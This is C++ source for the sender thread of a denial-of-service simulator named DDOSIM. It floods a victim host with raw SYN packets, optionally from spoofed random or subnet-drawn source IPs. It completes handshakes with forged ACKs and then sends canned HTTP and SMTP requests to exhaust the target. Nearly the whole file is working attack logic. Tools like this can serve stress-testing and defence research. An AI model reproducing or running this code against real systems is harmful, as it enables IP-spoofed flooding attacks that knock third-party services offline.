#include "senderThread.h"
#include "tcpUtils.h"
#include <iostream>
#include <list>

u_char *payload1 = (u_char*)
"GET / HTTP/1.1\r\n\
Host: hostname\r\n\
User-Agent: DDOSIM\r\n\r\n";


u_char *payload2 = (u_char*)
"$MyNick ddosim|$Lock";

u_char *payload3 = (u_char*)
"EHLO ddosim";


list<Pkt> pktsToSend; 					//first send these packets
map<string, ConnInfo> connsInited;		//info about initiated connections
map<string, ConnInfo> connsEstab;		//info about established connections
pthread_mutex_t connMutex = PTHREAD_MUTEX_INITIALIZER; //mutual exclusion when accessing the connsInited map
pthread_mutex_t countMutex = PTHREAD_MUTEX_INITIALIZER; //mutual exclusion when modifying synNo,rstNo and finNo
pthread_mutex_t ackMutex = PTHREAD_MUTEX_INITIALIZER; //mutual exclusion when accessing pktsToSend (ACKs)

void sendAck(u_char *packet, int packet_size, int network, 
			int v, string victimIpStr, int requestType);
void sendRequest(Pkt pkt, int network, int type, int v);
int getNumConnsEstab();


// This thread sends SYN packets to initiate TCP connsInited
// and store the information about them into connsInited map
void* senderThread(void *arg)
{
	SenderThreadArg *targ = (SenderThreadArg*)arg;

	string error;
	u_long localIp = 0, sourceIp = 0;
	string localIpStr;

	string ifName 	= targ->ifName;
	bool doSpoof 	= targ->doSpoof;
	int count 		= targ->count;
	int wait 		= targ->wait;
	int v			= targ->verbose;
	u_long victimIp	= targ->victimIp;
	string victimIpStr = (char*)libnet_host_lookup(victimIp, 0);
	int victimPort	= targ->victimPort;
	int requestType = targ->requestType;
	int threadId 	= targ->threadId;
	string srcNetStr= targ->srcNetStr;

	if(v)cout << "Sender thread " << threadId << " started" << endl;

	targ->threadId++;

	// Initialize packet sending component
    int network = libnet_open_raw_sock(IPPROTO_RAW);
    if (network == -1)
    {
        libnet_error(LIBNET_ERR_FATAL, (char*)"Can't open network. Are you root? Sender thread exit\n");
		pthread_exit(NULL);
    }

	// Get local IP address
	if(!(localIp = getLocalIp(ifName, error))) {
		cout << "Error while getting local IP address: " << error << endl;
		pthread_exit(NULL);
	}
	localIpStr = (char*)libnet_host_lookup(localIp, 0);

	// Initialize the generic packet
    int packet_size = LIBNET_IP_H + LIBNET_TCP_H; // no payload
	u_char *packet;
    libnet_init_packet(packet_size, &packet);
    if (packet == NULL) {
        libnet_error(LIBNET_ERR_FATAL, (char*)"libnet_init_packet failed\n");
		pthread_exit(NULL);
    }

	libnet_seed_prand();
	//sourceIp = libnet_name_resolve((u_char *)"192.168.10.55", LIBNET_RESOLVE);
	sourceIp = localIp;

	//don't start to send until we receive the signal
	while(*(targ->run) == false) usleep(100);	

	// send SYN packets
	while(*(targ->run)) 
	{
		// send one ACK packet from queue
		pthread_mutex_lock(&ackMutex);
		if(!pktsToSend.empty()) {
			sendAck(packet, packet_size, network, v, victimIpStr, requestType);
			pthread_mutex_unlock(&ackMutex);

			pthread_mutex_lock(&countMutex);
			(*targ->connNo)++;
			if(v)cout << "Sent ACK packet to " << victimIpStr << ". Connection " << *targ->connNo << " completed" << endl;
			pthread_mutex_unlock(&countMutex);
		} else {
			pthread_mutex_unlock(&ackMutex);
		}

		//send one SYN packet (initiate one new connection)
		pthread_mutex_lock(&countMutex);
		if((count > 0 && *targ->synNo < count) || count<=0) {
			(*targ->synNo)++;
			pthread_mutex_unlock(&countMutex);
			// reset connection map when it gets too big 
			if(count <= 0 && connsInited.size() > 10000) {
				pthread_mutex_lock(&connMutex);
				connsInited.clear();
				pthread_mutex_unlock(&connMutex);
			}

			if(v)cout << "Beginning connection " << *targ->synNo << ". Consize: " << connsInited.size() << endl;

			libnet_seed_prand();
			if(doSpoof) {
				if(srcNetStr != "") {
					char bufIp[255];
					sprintf(bufIp, "%s%i", 
							(srcNetStr.substr(0, srcNetStr.length()-1).c_str()), 
							(int)libnet_get_prand(PR8)%254+1);
					sourceIp = libnet_name_resolve((u_char*)bufIp, LIBNET_RESOLVE);
					//cout << "Source IP: " << bufIp << endl;
				} else {
					sourceIp = libnet_get_prand(PRu32);
				}
			}

			int sourcePort = libnet_get_prand(PRu16);
			int seqn = libnet_get_prand(PRu32);
			int ackn = libnet_get_prand(PRu32);

			TcpUtils::buildSYN(packet, sourceIp, victimIp, sourcePort, victimPort, seqn, ackn);
    		if (libnet_write_ip(network, packet, packet_size) < packet_size) {
       			libnet_error(LN_ERR_WARNING, (char*)"libnet_write_ip only wrote less then %d bytes\n", packet_size);
    		}
			if(v)cout << "Sent SYN packet to " << victimIpStr << " from " << libnet_host_lookup(sourceIp, 0) << endl;

			//add the new connection to map
			ConnInfo coninfo;
			coninfo.srcIp = sourceIp;
			coninfo.srcPort = sourcePort;
			coninfo.state = STATE_SYN_SENT;
			
			pthread_mutex_lock(&connMutex);
			connsInited[connId(sourceIp, sourcePort)] = coninfo;
			pthread_mutex_unlock(&connMutex);
			//if(v)cout << "Connection id: " << connId(sourceIp, sourcePort) << endl;

			// Delay between sending SYN packets
			mydelay(wait);
		} else {
			pthread_mutex_unlock(&countMutex);
			// we have finished initiating all the requested connsInited
			// now wait for response packets or for finish signal
			usleep(100);
		}
	}
	//Cleanup
    if (libnet_close_raw_sock(network) == -1)
    {
        libnet_error(LN_ERR_WARNING, (char*)"libnet_close_raw_sock couldn't close the interface");
    }
    libnet_destroy_packet(&packet);

	if(v)cout << "Sender thread " << threadId << " finished" << endl;

	pthread_exit(NULL);;
}


// This function sends one ACK to complete the 3-way handshake
void sendAck(u_char *packet, int packet_size, int network, 
			int v, string victimIpStr, int requestType)
{
/*
		if(count <= 0 && synNo > 0 && synNo % 100 < threadNo && !v) { //TODO
			cout << synNo << " connsInited initiated. " << connNo << " responses by now. ";
			cout << "connsInited size: " << connsInited.size() << endl;
		} else if (count > 0 && synNo >= count && finishMsg == false) {
			cout << synNo << " TCP connsInited initiated. Waiting for server responses..." << endl;
			finishMsg = true;
		}
*/
	Pkt pkt = pktsToSend.front();
	pktsToSend.pop_front();

	//TcpUtils::buildACK(packet, pkt.srcIp, pkt.dstIp, pkt.srcPort, pkt.dstPort, pkt.seqn, pkt.ackn);
	TcpUtils::buildACK(packet, 
				pkt.srcIp, pkt.dstIp, 
				pkt.srcPort, pkt.dstPort, 
				pkt.seqn, pkt.ackn);

    if (libnet_write_ip(network, packet, packet_size) < packet_size) {
		libnet_error(LN_ERR_WARNING, (char*)"libnet_write_ip only wrote less then %d bytes\n", packet_size);
    }

	// Add new entry to connsEstab map
	ConnInfo connInfo;
	connInfo.srcIp = pkt.srcIp;
	connInfo.srcPort = pkt.srcPort;
	connInfo.state = STATE_ESTABLISHED;
	connsEstab[connId(pkt.srcIp, pkt.srcPort)] = connInfo; 

	if(requestType != 0) {
		sendRequest(pkt, network, requestType, v);
	}
}


void sendRequest(Pkt pkt, int network, int type, int v) 
{
	u_char* payload = NULL;

	switch(type) {
		case HTTP_VALID:
			payload = payload1;
			break;
		case HTTP_INVALID:
			payload = payload2;
			break;
		case SMTP_EHLO:
			payload = payload3;
			break;
		default:
			if(v)cout << "Unknown request type" << endl;
			return;
	}

	u_char *dataPacket;
	int dataPackSize = LIBNET_IP_H + LIBNET_TCP_H + strlen((char *)payload);
	libnet_init_packet(dataPackSize, &dataPacket);
	if (dataPacket != NULL) {
		TcpUtils::buildTcpData(dataPacket, 
					pkt.srcIp, pkt.dstIp,
					pkt.srcPort, pkt.dstPort, 
					pkt.seqn, pkt.ackn, 
					payload);
		if (libnet_write_ip(network, dataPacket, dataPackSize) < dataPackSize) {
  			libnet_error(LN_ERR_WARNING, (char*)"libnet_write_ip only wrote less then %d bytes\n", dataPackSize);
		}
		if(v)cout << "HTTP request packet sent" << endl;
		libnet_destroy_packet(&dataPacket);
    } else {
		if(v)cout << "libnet_init_packet failed" << endl;
	}
}

int getNumConnsEstab()
{
	int num;
	pthread_mutex_lock(&ackMutex);
	num = connsEstab.size();
	pthread_mutex_unlock(&ackMutex);

	return num;
}





